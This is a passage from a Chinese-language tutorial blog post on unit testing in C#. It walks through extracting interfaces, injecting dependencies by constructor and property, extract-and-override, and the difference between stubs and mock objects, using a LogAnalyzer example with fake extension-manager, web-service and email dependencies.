<p>&emsp;&emsp;在上图中，我们引入了存根 ExtensionManagerStub 破除依赖，现在我们得代码不应该知道也不会关心它使用的扩展管理器的内部实现。</p>
<h3 id="重构代码提高可测试性"><a href="#重构代码提高可测试性" class="headerlink" title="重构代码提高可测试性"></a>重构代码提高可测试性</h3><p>有两类打破依赖的重构方法，<strong>二者相互依赖</strong>，他们被称为 A 型和 B 型重构。  </p>
<p>（1）A 型 把具体类抽象成接口或委托；<br>&emsp;&emsp;下面我们实践抽取接口将底层实现变为可替换的，继续上述的 IsValidLogFileName 方法。  </p>
<p>&emsp;&emsp;<strong><em>Step1.</em></strong> 我们将和文件系统打交道的代码分离到一个单独的类中，以便将来在代码中替换带对这个类的调用。<br>&emsp;&emsp;① 使用抽取出的类</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">bool</span> <span class="title">IsValidLogFileName</span>(<span class="params"><span class="keyword">string</span> fileName</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    FileExtensionManager manager = <span class="keyword">new</span> FileExtensionManager();</span><br><span class="line">    <span class="keyword">return</span> manager.IsValid(fileName);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;② 定义抽取出的类</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">FileExtensionManager</span> : <span class="title">IExtensionManager</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">bool</span> <span class="title">IsValid</span>(<span class="params"><span class="keyword">string</span> fileName</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">bool</span> result = <span class="literal">false</span>;</span><br><span class="line">        <span class="comment">// 读取文件</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;<strong><em>Step2.</em></strong> 然后我们从一个已知的类 FileExtensionManager 抽取出一个接口 IExtensionManager 。</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title">IExtensionManager</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">IsValid</span>(<span class="params"><span class="keyword">string</span> fileName</span>)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;<strong><em>Step3.</em></strong> 创建一个实现 IExtensionManager 接口的简单存根代码作为可替换的底层实现。</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">AlwaysValidFakeExtensionManager</span> : <span class="title">IExtensionManager</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">bool</span> <span class="title">IsValid</span>(<span class="params"><span class="keyword">string</span> fileName</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;于是，IsValidLogFileName 方法就可以进行重构了：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">bool</span> <span class="title">IsValidLogFileName</span>(<span class="params"><span class="keyword">string</span> fileName</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    IExtensionManager manager = <span class="keyword">new</span> FileExtensionManager();</span><br><span class="line">    <span class="keyword">return</span> manager.IsValid(fileName);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;但是，这里被测试方法还是对具体类进行<strong>直接调用</strong>，我们必须想办法让测试方法调用伪对象而不是 IExtensionManager 的原本实现，于是我们想到了 <strong>DI</strong>（依赖注入），这时就需要 B 型重构。  </p>
<p>（2）<strong>B 型</strong> 重构代码，从而能够对其注入这种委托和接口的伪实现。<br>&emsp;&emsp;刚刚我们想到了依赖注入，依赖注入的主要表现形式就是构造函数注入与属性注入，于是这里我们主要来看看构造函数层次与属性层次如何注入一个伪对象。  </p>
<p>&emsp;&emsp;① 通过构造函数注入伪对象</p>
<figure class="image-box">
                <img src="381412-20160502161436669-241453209.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;根据上图所示的流程，我们可以重构LogAnalyzer代码：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">LogAnalyzer</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> IExtensionManager manager;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">LogAnalyzer</span>(<span class="params">IExtensionManager manager</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">this</span>.manager = manager;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">bool</span> <span class="title">IsValidLogFileName</span>(<span class="params"><span class="keyword">string</span> fileName</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">return</span> manager.IsValid(fileName);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;其次，再添加新的测试代码：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">[<span class="meta">TestFixture</span>]</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">LogAnalyzerTests</span></span><br><span class="line">&#123;</span><br><span class="line">    [<span class="meta">Test</span>]</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">IsValidFileName_NameSupportExtension_ReturnsTrue</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="comment">// 准备一个返回 true 的存根</span></span><br><span class="line">        FakeExtensionManager myFakeManager = <span class="keyword">new</span> FakeExtensionManager();</span><br><span class="line">        myFakeManager.WillBeValid = <span class="literal">true</span>;</span><br><span class="line">        <span class="comment">// 通过构造器注入传入存根</span></span><br><span class="line">        LogAnalyzer analyzer = <span class="keyword">new</span> LogAnalyzer(myFakeManager);</span><br><span class="line">        <span class="keyword">bool</span> result = analyzer.IsValidLogFileName(<span class="string">"short.ext"</span>);</span><br><span class="line"></span><br><span class="line">        Assert.AreEqual(<span class="literal">true</span>, result);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义一个最简单的存根</span></span><br><span class="line">    <span class="keyword">internal</span> <span class="keyword">class</span> <span class="title">FakeExtensionManager</span> : <span class="title">IExtensionManager</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">bool</span> WillBeValid = <span class="literal">false</span>;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">bool</span> <span class="title">IsValid</span>(<span class="params"><span class="keyword">string</span> fileName</span>)</span></span><br><span class="line"><span class="function"></span>        &#123;</span><br><span class="line">            <span class="keyword">return</span> WillBeValid;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>Note：</strong>这里将伪存根类和测试代码放在一个文件里，因为目前这个伪对象只在这个测试类内部使用。它比起手工实现的伪对象和测试代码放在不同文件中，将它们放在一个文件里的话，定位、阅读以及维护代码都要容易的多。　</p>
</blockquote>
<p>&emsp;&emsp;② 通过属性设置注入伪对象<br>&emsp;&emsp;构造函数注入只是方法之一，属性也经常用来实现依赖注入。</p>
<figure class="image-box">
                <img src="381412-20160502162935810-956832803.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;根据上图所示的流程，我们可以重构LogAnalyzer类：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">LogAnalyzer</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> IExtensionManager manager;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 允许通过属性设置依赖项</span></span><br><span class="line">    <span class="keyword">public</span> IExtensionManager ExtensionManager</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">get</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> manager;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">set</span></span><br><span class="line">        &#123;</span><br><span class="line">            manager = <span class="keyword">value</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">LogAnalyzer</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">this</span>.manager = <span class="keyword">new</span> FileExtensionManager();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">bool</span> <span class="title">IsValidLogFileName</span>(<span class="params"><span class="keyword">string</span> fileName</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">return</span> manager.IsValid(fileName);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;其次，新增一个测试方法，改为属性注入方式：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[<span class="meta">Test</span>]</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">IsValidFileName_SupportExtension_ReturnsTrue</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 设置要使用的存根，确保其返回 true</span></span><br><span class="line">    FakeExtensionManager myFakeManager = <span class="keyword">new</span> FakeExtensionManager();</span><br><span class="line">    myFakeManager.WillBeValid = <span class="literal">true</span>;</span><br><span class="line">    <span class="comment">// 创建 analyzer，注入存根</span></span><br><span class="line">    LogAnalyzer log = <span class="keyword">new</span> LogAnalyzer();</span><br><span class="line">    log.ExtensionManager = myFakeManager;</span><br><span class="line">    <span class="keyword">bool</span> result = log.IsValidLogFileName(<span class="string">"short.ext"</span>);</span><br><span class="line"></span><br><span class="line">    Assert.AreEqual(<span class="literal">true</span>, result);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="image-box">
                <img src="381412-20160502234739591-126395981.jpg" alt title class>
                <p></p>
            </figure>

<blockquote>
<p><strong>Note：</strong>如果你想表明被测试类的某个依赖项是可选的，或者测试可以放心使用默认创建的这个依赖项实例，这时你就可以使用属性注入。</p>
</blockquote>
<h3 id="抽取和重写"><a href="#抽取和重写" class="headerlink" title="抽取和重写"></a>抽取和重写</h3><p>&emsp;&emsp;抽取和重写是一项强大的技术，可直接替换依赖项，实现起来快速干净，可以让我们编写更少的接口、更多的虚函数。</p>
<figure class="image-box">
                <img src="456.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;还是继续上面的例子，首先改造被测试类（位于 Manulife.LogAn），添加一个返回真实实例的虚工厂方法，正常在代码中使用工厂方法：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">LogAnalyzerUsingFactoryMethod</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">bool</span> <span class="title">IsValidLogFileName</span>(<span class="params"><span class="keyword">string</span> fileName</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="comment">// use virtual method</span></span><br><span class="line">        <span class="keyword">return</span> GetManager().IsValid(fileName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">virtual</span> IExtensionManager <span class="title">GetManager</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="comment">// hard code</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> FileExtensionManager();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;其次，在改造测试项目（位于 Manulife.LogAn.UnitTests），创建一个新类，声明这个新类继承自被测试类，创建一个我们要替换的接口（IExtensionManager）类型的公共字段（不需要属性 get 和 set 方法）：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">TestableLogAnalyzer</span> : <span class="title">LogAnalyzerUsingFactoryMethod</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> IExtensionManager manager;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">TestableLogAnalyzer</span>(<span class="params">IExtensionManager manager</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">this</span>.manager = manager;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回你指定的值</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">override</span> IExtensionManager <span class="title">GetManager</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.manager;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;最后，改造测试代码，这里我们创建的是新派生类而非被测试类的实例，配置这个新实例的公共字段，设置成我们在测试中创建的存根实例 FakeExtensionManager：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[<span class="meta">Test</span>]</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">OverrideTest</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    FakeExtensionManager stub = <span class="keyword">new</span> FakeExtensionManager();</span><br><span class="line">    stub.WillBeValid = <span class="literal">true</span>;</span><br><span class="line">    <span class="comment">// 创建被测试类的派生类的实例</span></span><br><span class="line">    TestableLogAnalyzer logan = <span class="keyword">new</span> TestableLogAnalyzer(stub);</span><br><span class="line">    <span class="keyword">bool</span> result = logan.IsValidLogFileName(<span class="string">"stubfile.ext"</span>);</span><br><span class="line"></span><br><span class="line">    Assert.AreEqual(<span class="literal">true</span>, result);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="image-box">
                <img src="381412-20160504000524169-26495821.jpg" alt title class>
                <p></p>
            </figure>

<h2 id="交互测试-模拟对象"><a href="#交互测试-模拟对象" class="headerlink" title="交互测试-模拟对象"></a>交互测试-模拟对象</h2><p>&emsp;&emsp;工作单元可能有三种最终结果，目前为止，我们编写过的测试只针对前两种：返回值和改变系统状态。现在，我们来了解如何测试第三种最终结果 —— 调用第三方对象。</p>
<h3 id="模拟对象与存根的区别"><a href="#模拟对象与存根的区别" class="headerlink" title="模拟对象与存根的区别"></a>模拟对象与存根的区别</h3><p>&emsp;&emsp;模拟对象和存根之间的区别很小，但二者之间的区别非常微妙，但又很重要。二者最根本的区别在于：</p>
<blockquote>
<p>&emsp;&emsp;<strong>存根不会导致测试失败，而模拟对象可以。</strong></p>
</blockquote>
<p>&emsp;&emsp;下图展示了存根和模拟对象之间的区别，可以看到测试会使用模拟对象验证测试是否失败。</p>
<figure class="image-box">
                <img src="381412-20160505000230294-365957941.png" alt title class>
                <p></p>
            </figure>

<h3 id="第一个手工模拟对象"><a href="#第一个手工模拟对象" class="headerlink" title="第一个手工模拟对象"></a>第一个手工模拟对象</h3><p>&emsp;&emsp;创建和使用模拟对象的方法与使用存根类似，只是模拟对象比存根多做一件事：它保存通讯的历史记录，这些记录之后用于预期（Expection）验证。  </p>
<p>&emsp;&emsp;假设我们的被测试项目 LogAnalyzer 需要和一个外部的 Web Service 交互，每次 LogAnalyzer 遇到一个过短的文件名，这个 Web Service 就会收到一个错误消息。遗憾的是，要测试的这个 Web Service 还没有完全实现。就算实现了，使用这个 Web Service 也会导致测试时间过长。<br>&emsp;&emsp;因此，我们需要重构设计，创建一个新的接口，之后用于这个接口创建模拟对象。这个接口只包括我们需要调用的 Web Service 方法。</p>
<figure class="image-box">
                <img src="789.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;<strong><em>Step1.</em></strong> 抽取接口，被测试代码可以使用这个接口而不是直接调用 Web Service。然后创建实现接口的模拟对象，它看起来十分像存根，但是它还存储了一些状态信息，然后测试可以对这些信息进行断言，验证模拟对象是否正确调用。</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title">IWebService</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">LogError</span>(<span class="params"><span class="keyword">string</span> message</span>)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">FakeWebService</span> : <span class="title">IWebService</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">string</span> LastError;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">LogError</span>(<span class="params"><span class="keyword">string</span> message</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">this</span>.LastError = message;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;<strong><em>Step2.</em></strong> 在被测试类中使用依赖注入（这里是构造函数注入）消费 Web Service：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">LogAnalyzer</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> IWebService service;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">LogAnalyzer</span>(<span class="params">IWebService service</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">this</span>.service = service;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Analyze</span>(<span class="params"><span class="keyword">string</span> fileName</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">if</span> (fileName.Length &lt; <span class="number">8</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 在产品代码中写错误日志</span></span><br><span class="line">            service.LogError(<span class="keyword">string</span>.Format(<span class="string">"Filename too short : &#123;0&#125;"</span>,fileName));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;<strong><em>Step3.</em></strong> 使用模拟对象测试 LogAnalyzer：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[<span class="meta">Test</span>]</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Analyze_TooShortFileName_CallsWebService</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    FakeWebService mockService = <span class="keyword">new</span> FakeWebService();</span><br><span class="line">    LogAnalyzer log = <span class="keyword">new</span> LogAnalyzer(mockService);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">string</span> tooShortFileName = <span class="string">"abc.ext"</span>;</span><br><span class="line">    log.Analyze(tooShortFileName);</span><br><span class="line">    <span class="comment">// 使用模拟对象进行断言</span></span><br><span class="line">    StringAssert.Contains(<span class="string">"Filename too short : abc.ext"</span>, mockService.LastError);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;可以看出，这里的测试代码中我们是对模拟对象进行断言，而非 LogAnalyzer 类，因为我们测试的是 LogAnalyzer 和 Web Service 之间的<strong>交互</strong>。</p>
<figure class="image-box">
                <img src="381412-20160505003746560-1222346715.jpg" alt title class>
                <p></p>
            </figure>

<h3 id="同时使用模拟对象和存根"><a href="#同时使用模拟对象和存根" class="headerlink" title="同时使用模拟对象和存根"></a>同时使用模拟对象和存根</h3><p>&emsp;&emsp;假设我们得 LogAnalyzer 不仅需要调用 Web Service，而且如果 Web Service 抛出一个错误，LogAnalyzer 还需要把这个错误记录在另一个外部依赖项里，即把错误用电子邮件发送给 Web Service 管理员，如下代码所示：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (fileName.Length &lt; <span class="number">8</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 在产品代码中写错误日志</span></span><br><span class="line">        service.LogError(<span class="keyword">string</span>.Format(<span class="string">"Filename too short : &#123;0&#125;"</span>, fileName));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (Exception ex)</span><br><span class="line">    &#123;</span><br><span class="line">        email.SendEmail(<span class="string">"a"</span>, <span class="string">"subject"</span>, ex.Message);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;可以看出，这里 LogAnalyzer 有两个外部依赖项：Web Service 和电子邮件服务。我们看到这段代码只包含调用外部对象的逻辑，没有返回值，也没有系统状态的改变，那么我们如何测试当 Web Service 抛出异常时 LogAnalyzer 正确地调用了电子邮件服务呢？<br>&emsp;&emsp;我们可以在测试代码中使用存根替换 Web Service 来模拟异常，然后模拟邮件服务来检查调用。测试的内容是 LogAnalyzer 与其他对象的交互。</p>
<figure class="image-box">
                <img src="000.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;<strong><em>Step1.</em></strong> 抽取 Email 接口，封装 Email 类</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title">IEmailService</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">SendEmail</span>(<span class="params">EmailInfo emailInfo</span>)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">EmailInfo</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">string</span> Body;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">string</span> To;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">string</span> Subject;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">EmailInfo</span>(<span class="params"><span class="keyword">string</span> to, <span class="keyword">string</span> subject, <span class="keyword">string</span> body</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">this</span>.To = to;</span><br><span class="line">        <span class="keyword">this</span>.Subject = subject;</span><br><span class="line">        <span class="keyword">this</span>.Body = body;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">override</span> <span class="keyword">bool</span> <span class="title">Equals</span>(<span class="params"><span class="keyword">object</span> obj</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        EmailInfo compared = obj <span class="keyword">as</span> EmailInfo;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> To == compared.To &amp;&amp; Subject == compared.Subject </span><br><span class="line">            &amp;&amp; Body == compared.Body;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;<strong><em>Step2.</em></strong> 封装 EmailInfo 类，重写<code>Equals</code>方法</p>
